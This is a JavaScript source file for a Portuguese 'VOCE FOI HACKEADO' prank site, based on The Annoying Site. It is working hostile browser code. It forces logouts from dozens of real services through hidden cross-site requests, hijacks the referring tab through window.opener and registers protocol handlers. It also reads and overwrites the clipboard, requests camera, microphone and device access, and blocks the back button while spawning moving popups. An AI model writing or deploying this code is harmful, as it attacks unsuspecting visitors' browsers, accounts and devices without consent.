/* global Element */

/**
 *  sos01.com.br
 *  Baseado em The Annoying Site (https://theannoyingsite.com) de Feross Aboukhadijeh
 *  e na versão ptoszek.pl de Jaczup.
 */

const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 360
const VELOCITY = 25
const MARGIN = 15
const TOP_MARGIN = 50
const TICK_LENGTH = 50

const SITE_NAME = 'sos01.com.br'
const SITE_URL = 'https://sos01.com.br'

const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;'

const ART = [
  `
VOCE FOI HACKEADO, NÃO TEM COMO FUGIR
  `,
  `
▓▓          ▓▓
▓▒▒▓       ▓▒▓
▓▒▒▒▓     ▓▒ ▒▓
▓▒▒▒▒▓▓▓▓▒▒ ▒▒▓
▓▒▒▒▒▒▒▒▒▒▒▒▒▒▓
▓▒▒▒ ▒▒▒▒▒▒ ▒▒ ▓
▓▒▒▒⭕▒▒▒▒▒⭕▒ ▓
▓▒▒▒▓▓▒▒▒▓▒▓▓ ▒▓▓▒GAME-OVER▒ HA, HA, HA, HA, HA, HA, HA, HA,░▓
▓  ♦️♦️♦️♦️♦️♦️ ▓
 ▓    HACKEADO  ▓
  ▓  ♦️♦️♦️♦️  ▓
    ▓        ▓
       ▓▓▓▓
  `
]

const SEARCHES = [
  'Ola, visite esse site sos01.com.br, haha',
  'os pássaros são engraçados lalalalalalalalalala',
  'VAIIIIIIIII BRASILLLLLLLLL',
  'VOCE FOI HACKEADO',
  'CUIdado onde voces clicammmm',
  'HA-HA-HA-HA-HA-HA-HA-HA-HA',
  'Cadeeeee o Caféeeeeee',
  'Menino Ney é o melhor'
]

const VIDEOS = [
  'media/videos/szybkakaczka.mp4',
  'media/videos/jaczup.mp4',
  'media/videos/duck.mp4',
  'media/videos/gratulacje.mp4',
  'media/videos/golomb.mp4',
  'media/videos/rickroll.mp4',
  'media/videos/kaczuszka.mp4',
  'media/videos/intro.mp4',
  'media/videos/puddi.mp4',
  'media/videos/clearmax.mp4',
  'media/videos/freestrona.mp4',
  'media/videos/mushbox.mp4',
  'media/videos/ajhsdfhjasdbhfjasdfs.mp4'
]

const FILE_DOWNLOADS = [
  'media/images/ptok.jpg',
  'media/images/ptokzjajami.jpeg',
  'media/images/zimowyptoszek.jpeg',
  'media/images/grubyptok.jpg',
  'media/images/kichajacyptoszek.jpg',
  'media/images/jaczup.jpg',
  'media/images/ptiszka.jpg',
  'media/images/ptakwspodniach.jpg',
  'media/images/jaczupme.png',
  'media/images/zlyptok.jpeg',
  'media/images/ptoszek.jpg',
  'media/images/lubieptoszki.png'
]

const PHRASES = [
  'VOCE FOI HACKEADO',
  'VOCE NÃO VAI FUGIR',
  'CADE O CAFE',
  'OI, TUDO BEM',
  'NAO OLHA PRO LADO',
  'JACZUP FOI AQUI',
  'VISITA SOS01 PONTO COM PONTO BR'
]

const LOGOUT_SITES = {
  AOL: ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
  'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
  Blogger: ['GET', 'https://www.blogger.com/logout.g'],
  Delicious: ['GET', 'https://www.delicious.com/logout'],
  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
  DreamHost: ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
  Gandi: ['GET', 'https://www.gandi.net/login/out'],
  GitHub: ['GET', 'https://github.com/logout'],
  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
  Google: ['GET', 'https://www.google.com/accounts/Logout'],
  Hulu: ['GET', 'https://secure.hulu.com/logout'],
  Instapaper: ['GET', 'https://www.instapaper.com/user/logout'],
  Linode: ['GET', 'https://manager.linode.com/session/logout'],
  LiveJournal: ['POST', 'https://www.livejournal.com/logout.bml', { 'action:killall': '1' }],
  MySpace: ['GET', 'https://www.myspace.com/index.cfm?fuseaction=signout'],
  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
  'New York Times': ['GET', 'https://www.nytimes.com/logout'],
  Newegg: ['GET', 'https://secure.newegg.com/NewMyAccount/AccountLogout.aspx'],
  Photobucket: ['GET', 'https://photobucket.com/logout'],
  Skype: ['GET', 'https://secure.skype.com/account/logout'],
  Slashdot: ['GET', 'https://slashdot.org/my/logout'],
  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
  ThinkGeek: ['GET', 'https://www.thinkgeek.com/brain/account/login.cgi?a=lo'],
  Threadless: ['GET', 'https://www.threadless.com/logout'],
  Tumblr: ['GET', 'https://www.tumblr.com/logout'],
  Vimeo: ['GET', 'https://vimeo.com/log_out'],
  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
  Woot: ['GET', 'https://account.woot.com/logout'],
  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }]
}

/**
 * Array to store the child windows spawned by this window.
 */
const wins = []

/**
 * Count of number of clicks
 */
let interactionCount = 0

/**
 * Number of iframes injected into the page for the "super logout" functionality.
 * See superLogout().
 */
let numSuperLogoutIframes = 0

/**
 * Ignora promessas rejeitadas e exceções de APIs que nem existem no navegador.
 */
function silent (promise) {
  if (promise && typeof promise.catch === 'function') promise.catch(() => {})
  return promise
}

const isChildWindow = (window.opener && isParentSameOrigin()) ||
  window.location.search.indexOf('child=true') !== -1

const isParentWindow = !isChildWindow

init()

if (isChildWindow) initChildWindow()
else initParentWindow()

/**
 * Initialization code for *both* parent and child windows.
 */
function init () {
  confirmPageUnload()

  interceptUserInput(event => {
    interactionCount += 1

    event.preventDefault()
    event.stopPropagation()

    if (event.which !== 0) openWindow()

    startVibrateInterval()
    enablePictureInPicture()
    triggerFileDownload()

    focusWindows()
    copySpamToClipboard()
    speak()
    startTheramin()

    // Capture key presses on the Command or Control keys, to interfere with the
    // "Close Window" shortcut.
    if (event.key === 'Meta' || event.key === 'Control') {
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
      window.print()
      requestWebauthnAttestation()
    } else {
      requestPointerLock()

      requestFullscreen()
      requestClipboardRead()
      requestMidiAccess()
      requestBluetoothAccess()
      requestUsbAccess()
      requestSerialAccess()
      requestHidAccess()
      requestCameraAndMic()
      if (Math.random() < 0.1) {
        // Don't request TouchID on every interaction in Safari since it blocks
        // the event loop and stops windows from moving
        requestWebauthnAttestation()
      }
    }
  })
}

/**
 * Initialization code for child windows.
 */
function initChildWindow () {
  registerProtocolHandlers()
  hideCursor()
  moveWindowBounce()
  setupFollowWindow()
  startVideo()
  detectWindowClose()
  triggerFileDownload()
  speak()
  rainbowThemeColor()
  animateUrlWithEmojis()

  interceptUserInput(() => {
    if (interactionCount === 1) {
      startAlertInterval()
    }
  })
}

/**
 * Initialization code for parent windows.
 */
function initParentWindow () {
  showHelloMessage()
  blockBackButton()
  fillHistory()
  startInvisiblePictureInPictureVideo()

  interceptUserInput(() => {
    // Only run these on the first interaction
    if (interactionCount === 1) {
      registerProtocolHandlers()
      attemptToTakeoverReferrerWindow()
      hideCursor()
      startVideo()
      startAlertInterval()
      superLogout()
      removeHelloMessage()
      rainbowThemeColor()
      animateUrlWithEmojis()
      speak('Isso foi um erro')
    }
  })
}

/**
 * Sites que apontam para cá com target='_blank' deixam window.opener setado,
 * o que permite redirecionar a página de quem fez o link.
 */
function attemptToTakeoverReferrerWindow () {
  if (isParentWindow && window.opener && !isParentSameOrigin()) {
    window.opener.location = `${window.location.origin}/?child=true`
  }
}

/**
 * Returns true if the parent window is on the same origin.
 */
function isParentSameOrigin () {
  try {
    return window.opener.location.origin === window.location.origin
  } catch (err) {
    return false
  }
}

/**
 * Ask the user "are you sure you want to leave this page?".
 */
function confirmPageUnload () {
  window.addEventListener('beforeunload', event => {
    speak('Não vai embora!')
    event.returnValue = true
  })
}

/**
 * Attempt to register all possible browser-whitelisted protocols to be handled by
 * this web app instead of their default handlers.
 */
function registerProtocolHandlers () {
  if (typeof navigator.registerProtocolHandler !== 'function') return

  const protocolWhitelist = [
    'bitcoin', 'geo', 'im', 'irc', 'ircs', 'magnet', 'mailto', 'mms', 'news',
    'nntp', 'sip', 'sms', 'smsto', 'ssh', 'tel', 'urn', 'webcal', 'wtai', 'xmpp'
  ]

  const handlerUrl = window.location.origin + window.location.pathname + '?u=%s'

  protocolWhitelist.forEach(proto => {
    try {
      silent(navigator.registerProtocolHandler(proto, handlerUrl, SITE_NAME))
    } catch (err) {}
  })
}

/**
 * Attempt to access the user's camera and microphone, and enable the torch.
 */
function requestCameraAndMic () {
  if (!navigator.mediaDevices ||
      typeof navigator.mediaDevices.getUserMedia !== 'function') {
    return
  }

  silent(navigator.mediaDevices.enumerateDevices().then(devices => {
    const cameras = devices.filter(device => device.kind === 'videoinput')

    if (cameras.length === 0) return
    const camera = cameras[cameras.length - 1]

    silent(navigator.mediaDevices.getUserMedia({
      deviceId: camera.deviceId,
      facingMode: ['user', 'environment'],
      audio: true,
      video: true
    }).then(stream => {
      const track = stream.getVideoTracks()[0]
      if (!window.ImageCapture) return
      const imageCapture = new window.ImageCapture(track)

      silent(imageCapture.getPhotoCapabilities().then(() => {
        track.applyConstraints({ advanced: [{ torch: true }] })
      }, () => {}))
    }, () => {}))
  }, () => {}))
}

/**
 * Animating the URL with emojis
 */
function animateUrlWithEmojis () {
  if (window.ApplePaySession) {
    // Safari doesn't show the full URL anyway, so we can't animate it
    return
  }
  const rand = Math.random()
  if (rand < 0.33) {
    animateUrlWithBabies()
  } else if (rand < 0.67) {
    animateUrlWithWave()
  } else {
    animateUrlWithMoons()
  }

  function animateUrlWithBabies () {
    const e = ['🏻', '🏼', '🏽', '🏾', '🏿']

    setInterval(() => {
      let s = ''
      let i; let m

      for (i = 0; i < 10; i++) {
        m = Math.floor(e.length * ((Math.sin((Date.now() / 100) + i) + 1) / 2))
        s += '👶' + e[m]
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithWave () {
    setInterval(() => {
      let i; let n; let s = ''

      for (i = 0; i < 10; i++) {
        n = Math.floor(Math.sin((Date.now() / 200) + (i / 2)) * 4) + 4

        s += String.fromCharCode(0x2581 + n)
      }

      window.location.hash = s
    }, 100)
  }

  function animateUrlWithMoons () {
    const f = ['H', 'A', 'C', 'K', 'E', 'A', 'D', 'O', '']
    const d = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    let m = 0

    setInterval(() => {
      let s = ''
      let x = 0

      if (!m) {
        while (d[x] === 4) {
          x++
        }

        if (x >= d.length) m = 1
        else {
          d[x]++
        }
      } else {
        while (d[x] === 0) {
          x++
        }

        if (x >= d.length) m = 0
        else {
          d[x]++

          if (d[x] === 8) d[x] = 0
        }
      }

      d.forEach(function (n) {
        s += f[n]
      })

      window.location.hash = s
    }, 100)
  }
}

/**
 * Lock the user's pointer, without even being in full screen!
 */
function requestPointerLock () {
  try {
    const requestPointerLockApi = (
      (document.body.requestPointerLock && document.body.requestPointerLock.bind(document.body)) ||
      (document.body.webkitRequestPointerLock && document.body.webkitRequestPointerLock.bind(document.body)) ||
      (document.body.mozRequestPointerLock && document.body.mozRequestPointerLock.bind(document.body)) ||
      (document.body.msRequestPointerLock && document.body.msRequestPointerLock.bind(document.body))
    )

    if (requestPointerLockApi) silent(requestPointerLockApi())
  } catch (err) {}
}

/**
 * Start vibrating the device at random intervals, on supported devices.
 */
function startVibrateInterval () {
  if (typeof window.navigator.vibrate !== 'function') return
  setInterval(() => {
    const duration = Math.floor(Math.random() * 600)
    window.navigator.vibrate(duration)
  }, 1000)

  window.addEventListener('gamepadconnected', event => {
    const gamepad = event.gamepad
    if (gamepad.vibrationActuator) {
      setInterval(() => {
        if (gamepad.connected) {
          silent(gamepad.vibrationActuator.playEffect('dual-rumble', {
            duration: Math.floor(Math.random() * 600),
            strongMagnitude: Math.random(),
            weakMagnitude: Math.random()
          }))
        }
      }, 1000)
    }
  })
}

/**
 * Intercept all user-initiated events and call the given function, `onInput`.
 */
function interceptUserInput (onInput) {
  document.body.addEventListener('touchstart', onInput, { passive: false })

  document.body.addEventListener('mousedown', onInput)
  document.body.addEventListener('mouseup', onInput)
  document.body.addEventListener('click', onInput)

  document.body.addEventListener('keydown', onInput)
  document.body.addEventListener('keyup', onInput)
  document.body.addEventListener('keypress', onInput)
}

/**
 * Start an invisible, muted video so we have one ready to put into
 * picture-in-picture mode on the first user-interaction.
 */
function startInvisiblePictureInPictureVideo () {
  const video = document.createElement('video')
  video.src = getRandomArrayEntry(VIDEOS)
  video.loop = true
  video.muted = true
  video.playsInline = true
  video.preload = 'auto'
  video.style = HIDDEN_STYLE
  video.autoplay = true
  silent(video.play())

  document.body.appendChild(video)
}

/**
 * Activate Safari's picture-in-picture feature. Requires user-initiated event.
 */
function enablePictureInPicture () {
  const video = document.querySelector('video')
  if (!video || !document.pictureInPictureEnabled) return

  video.style = ''
  video.muted = false
  silent(video.requestPictureInPicture().then(() => silent(video.play()), () => {}))
}

/**
 * Focus all child windows. Requires user-initiated event.
 */
function focusWindows () {
  wins.forEach(win => {
    if (!win.closed) win.focus()
  })
}

/**
 * Open a new popup window. Requires user-initiated event.
 */
function openWindow () {
  const { x, y } = getRandomCoords()
  const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
  const win = window.open(window.location.pathname + '?child=true', '', opts)

  // New windows may be blocked by the popup blocker
  if (!win) return
  wins.push(win)

  if (wins.length === 2) setupSearchWindow(win)
}

/**
 * Hide the user's cursor!
 */
function hideCursor () {
  document.querySelector('html').style = 'cursor: none;'
}

/**
 * Trigger a file download immediately.
 */
function triggerFileDownload () {
  const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
  const a = document.createElement('a')
  a.href = fileName
  a.download = fileName.split('/').pop()
  a.click()
}

/**
 * Speak the given `phrase` using text-to-speech.
 */
function speak (phrase) {
  if (!window.speechSynthesis) return
  if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
  silent(window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase)))
}

/**
 * Start an annoying theramin that changes pitch and volume depending on the
 * mouse position. Uses ONE AudioContext: o navegador limita a ~6 contextos.
 */
let theraminStarted = false
function startTheramin () {
  if (theraminStarted) return
  theraminStarted = true

  const audioContext = new AudioContext()
  const oscillatorNode = audioContext.createOscillator()
  const gainNode = audioContext.createGain()

  const pitchBase = 50
  const pitchRange = 4000

  const wave = audioContext.createPeriodicWave(
    Array(10).fill(0).map((v, i) => Math.cos(i)),
    Array(10).fill(0).map((v, i) => Math.sin(i))
  )

  oscillatorNode.setPeriodicWave(wave)

  oscillatorNode.connect(gainNode)
  gainNode.connect(audioContext.destination)

  oscillatorNode.start(0)

  const oscillator = ({ pitch, volume }) => {
    oscillatorNode.frequency.value = pitchBase + pitch * pitchRange
    gainNode.gain.value = volume * 0.5
  }

  silent(audioContext.resume())

  document.body.addEventListener('mousemove', event => {
    const { clientX, clientY } = event
    const { clientWidth, clientHeight } = document.body
    const pitch = (clientX - clientWidth / 2) / clientWidth
    const volume = (clientY - clientHeight / 2) / clientHeight
    oscillator({ pitch, volume })
  })
}

/**
 * Attempt to read the user's clipboard. Requires user-initiated event.
 */
function requestClipboardRead () {
  try {
    silent(navigator.clipboard.readText().then(
      data => {
        if (!window.ApplePaySession) {
          // Don't alert in Safari because it blocks the event loop
          window.alert("Li sua área de transferência: '" + data + "'")
        }
      },
      () => {}
    ))
  } catch (err) {}
}

/**
 * Request Webauthn attestation. Requires user-initiated event.
 */
function requestWebauthnAttestation () {
  try {
    if (!navigator.credentials) return

    const createCredentialDefaultArgs = {
      publicKey: {
        rp: {
          name: SITE_NAME
        },
        user: {
          id: new Uint8Array(16),
          name: 'VOCE_FOI_HACKEADO@SOS01.COM.BR',
          displayName: 'VOCE FOI HACKEADO'
        },
        pubKeyCredParams: [{
          type: 'public-key',
          alg: -7
        }],
        attestation: 'direct',
        timeout: 60000,
        challenge: new Uint8Array([
          0x8C, 0x0A, 0x26, 0xFF, 0x22, 0x91, 0xC1, 0xE9, 0xB9, 0x4E, 0x2E, 0x17, 0x1A, 0x98, 0x6A, 0x73,
          0x71, 0x9D, 0x43, 0x48, 0xD5, 0xA7, 0x6A, 0x15, 0x7E, 0x38, 0x94, 0x52, 0x77, 0x97, 0x0F, 0xEF
        ]).buffer
      }
    }

    const getCredentialDefaultArgs = {
      publicKey: {
        timeout: 60000,
        challenge: new Uint8Array([
          0x79, 0x50, 0x68, 0x71, 0xDA, 0xEE, 0xEE, 0xB9, 0x94, 0xC3, 0xC2, 0x15, 0x67, 0x65, 0x26, 0x22,
          0xE3, 0xF3, 0xAB, 0x3B, 0x78, 0x2E, 0xD5, 0x6F, 0x81, 0x26, 0xE2, 0xA6, 0x01, 0x7D, 0x74, 0x50
        ]).buffer
      }
    }

    silent(navigator.credentials.create(createCredentialDefaultArgs)
      .then(cred => {
        const idList = [{
          id: cred.rawId,
          transports: ['usb', 'nfc', 'ble'],
          type: 'public-key'
        }]
        getCredentialDefaultArgs.publicKey.allowCredentials = idList
        return navigator.credentials.get(getCredentialDefaultArgs)
      }, () => {}))
  } catch (err) {}
}

/**
 * Request access to MIDI devices.
 */
function requestMidiAccess () {
  try {
    silent(navigator.requestMIDIAccess({ sysex: true }))
  } catch (err) {}
}

/**
 * Request access to Bluetooth devices.
 */
function requestBluetoothAccess () {
  try {
    silent(navigator.bluetooth.requestDevice({ acceptAllDevices: true })
      .then(device => device.gatt.connect(), () => {}))
  } catch (err) {}
}

/**
 * Request access to USB devices.
 */
function requestUsbAccess () {
  try {
    silent(navigator.usb.requestDevice({ filters: [{}] }))
  } catch (err) {}
}

/**
 * Request access to Serial devices.
 */
function requestSerialAccess () {
  try {
    silent(navigator.serial.requestPort({ filters: [] }))
  } catch (err) {}
}

/**
 * Request access to HID devices.
 */
function requestHidAccess () {
  try {
    silent(navigator.hid.requestDevice({ filters: [] }))
  } catch (err) {}
}

/**
 * Move the window around the screen and bounce off of the screen edges.
 */
function moveWindowBounce () {
  let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
  let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)

  setInterval(() => {
    const x = window.screenX
    const y = window.screenY
    const width = window.outerWidth
    const height = window.outerHeight

    if (x < MARGIN) vx = Math.abs(vx)
    if (x + width > SCREEN_WIDTH - MARGIN) vx = -1 * Math.abs(vx)
    if (y < TOP_MARGIN) vy = Math.abs(vy)
    if (y + height > SCREEN_HEIGHT - MARGIN) vy = -1 * Math.abs(vy)

    window.moveBy(vx, vy)
  }, TICK_LENGTH)
}

/**
 * Follow the user's mouse
 */
function setupFollowWindow () {
  document.addEventListener('mousemove', function (e) {
    window.moveTo(e.screenX - (WIN_WIDTH / 2), e.screenY - (WIN_HEIGHT / 2))
  })
}

/**
 * Show a random troll video in the window.
 */
function startVideo () {
  const video = document.createElement('video')

  video.src = getRandomArrayEntry(VIDEOS)
  video.autoplay = true
  video.loop = true
  video.muted = false
  video.playsInline = true
  video.style = 'width: 100%; height: 100%;'

  silent(video.play())

  document.body.appendChild(video)
}

/**
 * When a child window closes, notify the parent window.
 */
function detectWindowClose () {
  window.addEventListener('unload', () => {
    if (window.opener && !window.opener.closed && window.opener.onCloseWindow) {
      window.opener.onCloseWindow(window)
    }
  })
}

/**
 * Handle a child window closing.
 */
function onCloseWindow (win) {
  const i = wins.indexOf(win)
  if (i >= 0) wins.splice(i, 1)
}

/**
 * Show the unsuspecting user a friendly hello message.
 */
function showHelloMessage () {
  const template = document.querySelector('template')
  if (!template) return
  const clone = document.importNode(template.content, true)
  document.body.appendChild(clone)
}

/**
 * Remove the hello message.
 */
function removeHelloMessage () {
  const helloMessage = document.querySelector('.hello-message')
  if (helloMessage) helloMessage.remove()
}

/**
 * Change the theme color of the browser in a loop.
 * O HTML usa <meta name="theme-color">, então o seletor tem que ser por [name=...].
 */
function rainbowThemeColor () {
  function zeroFill (width, number, pad = '0') {
    width -= number.toString().length
    if (width > 0) return new Array(width + (/\./.test(number) ? 2 : 1)).join(pad) + number
    return number + ''
  }

  const meta = document.querySelector('meta[name="theme-color"]')
  if (!meta) return
  setInterval(() => {
    meta.setAttribute('content', '#' + zeroFill(6, Math.floor(Math.random() * 16777215).toString(16)))
  }, 50)
}

/**
 * Copy spam onto the user's clipboard. Requires user-initiated event.
 */
function copySpamToClipboard () {
  const randomArt = getRandomArrayEntry(ART) + `\nCheck out ${SITE_URL}`
  clipboardCopy(randomArt)
}

/**
 * Copy given text onto the user's clipboard. Requires user-initiated event.
 */
function clipboardCopy (text) {
  // A <span> contains the text to copy
  const span = document.createElement('span')
  span.textContent = text
  span.style.whiteSpace = 'pre'

  // An <iframe> isolates the <span> from the page's styles
  const iframe = document.createElement('iframe')
  iframe.sandbox = 'allow-same-origin'
  document.body.appendChild(iframe)

  let win = iframe.contentWindow
  win.document.body.appendChild(span)

  let selection = win.getSelection()

  // Firefox fails to get a selection from <iframe> window, so fallback
  if (!selection) {
    win = window
    selection = win.getSelection()
    document.body.appendChild(span)
  }

  const range = win.document.createRange()
  selection.removeAllRanges()
  range.selectNode(span)
  selection.addRange(range)

  let success = false
  try {
    success = win.document.execCommand('copy')
  } catch (err) {}

  selection.removeAllRanges()
  span.remove()
  iframe.remove()

  return success
}

/**
 * Show a modal dialog at a regular interval.
 */
function startAlertInterval () {
  setInterval(() => {
    if (Math.random() < 0.5) {
      showAlert()
    } else {
      window.print()
    }
  }, 120_000)
}

/**
 * Show an alert with 1000's of lines of ASCII art.
 */
function showAlert () {
  const randomArt = getRandomArrayEntry(ART)
  const longAlertText = Array(200).join(randomArt)
  window.alert(longAlertText)
}

/**
 * Fullscreen the browser window
 */
function requestFullscreen () {
  try {
    const requestFullscreen = Element.prototype.requestFullscreen ||
      Element.prototype.webkitRequestFullscreen ||
      Element.prototype.mozRequestFullScreen ||
      Element.prototype.msRequestFullscreen

    if (requestFullscreen) silent(requestFullscreen.call(document.body))
  } catch (err) {}
}

/**
 * Log the user out of top sites they're logged into.
 */
function superLogout () {
  function cleanup (el, delayCleanup) {
    if (delayCleanup) {
      delayCleanup = false
      return
    }
    el.parentNode.removeChild(el)
  }

  function get (url) {
    const img = document.createElement('img')
    img.onload = () => cleanup(img)
    img.onerror = () => cleanup(img)
    img.style = HIDDEN_STYLE
    document.body.appendChild(img)
    img.src = url
  }

  function post (url, params) {
    const iframe = document.createElement('iframe')
    iframe.style = HIDDEN_STYLE
    iframe.name = 'iframe' + numSuperLogoutIframes
    document.body.appendChild(iframe)

    numSuperLogoutIframes += 1

    const form = document.createElement('form')
    form.style = HIDDEN_STYLE

    let numLoads = 0
    iframe.onload = iframe.onerror = () => {
      if (numLoads >= 1) cleanup(iframe)
      numLoads += 1
    }
    form.action = url
    form.method = 'POST'
    form.target = iframe.name

    for (const param in params) {
      if (Object.prototype.hasOwnProperty.call(params, param)) {
        const input = document.createElement('input')
        input.type = 'hidden'
        input.name = param
        input.value = params[param]
        form.appendChild(input)
      }
    }

    document.body.appendChild(form)
    form.submit()
  }

  const logoutMessages = document.querySelector('.logout-messages')

  for (const name in LOGOUT_SITES) {
    const method = LOGOUT_SITES[name][0]
    const url = LOGOUT_SITES[name][1]
    const params = LOGOUT_SITES[name][2] || {}

    if (method === 'GET') {
      get(url)
    } else {
      post(url, params)
    }

    if (logoutMessages) {
      const div = document.createElement('div')
      div.innerText = `Deslogando você de ${name}...`
      logoutMessages.appendChild(div)
    }
  }
}

/**
 * Disable the back button.
 */
function blockBackButton () {
  window.addEventListener('popstate', () => {
    window.history.forward()
  })
}

/**
 * Fill the history with extra entries for this site.
 */
function fillHistory () {
  for (let i = 1; i < 20; i++) {
    window.history.pushState({}, '', window.location.pathname + '?q=' + i)
  }
  window.history.pushState({}, '', window.location.pathname)
}

/**
 * Get random x, y coordinates for a new window on the screen.
 */
function getRandomCoords () {
  const x = MARGIN +
    Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
  const y = TOP_MARGIN +
    Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - TOP_MARGIN))
  return { x, y }
}

/**
 * Get a random element from a given array, `arr`.
 */
function getRandomArrayEntry (arr) {
  return arr[Math.floor(Math.random() * arr.length)]
}

/**
 * Turn one of the popups into a Bing search window cycling through SEARCHES.
 */
function setupSearchWindow (win) {
  if (!win) return
  const { x, y } = getRandomCoords()
  win.moveTo(x, y)
  win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
  win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[0])
  let searchIndex = 1
  const interval = setInterval(() => {
    if (win.closed) {
      clearInterval(interval)
      onCloseWindow(win)
      return
    }

    win.window.location = window.location.pathname + '?child=true'
    setTimeout(() => {
      win.resizeTo(WIN_WIDTH, WIN_HEIGHT)
    }, 500)
    setTimeout(() => {
      const { x, y } = getRandomCoords()
      win.moveTo(x, y)
      win.resizeTo(WIN_WIDTH * 2, WIN_HEIGHT * 2)
      win.window.location = 'https://www.bing.com/search?q=' + encodeURIComponent(SEARCHES[searchIndex])

      searchIndex += 1
      if (searchIndex >= SEARCHES.length) {
        searchIndex = 0
      }
    }, 1000)
  }, 3000)
}

function detectBrowser () {
  const userAgent = navigator.userAgent
  const isIOS = /iPhone|iPad|iPod/i.test(userAgent)

  if (/samsungbrowser\//i.test(userAgent)) return 'samsung'
  if (/edg\//i.test(userAgent) || /edga\//i.test(userAgent)) return 'edge'
  if (/opr\//i.test(userAgent) || /opt\//i.test(userAgent)) return 'opera'
  if (/firefox\//i.test(userAgent)) return 'firefox'
  if (/chrome\//i.test(userAgent) || /CriOS/i.test(userAgent)) return 'chrome'
  if (/safari\//i.test(userAgent)) return 'safari'
  if (isIOS) return 'ios-device'

  return 'unknown'
                                             }
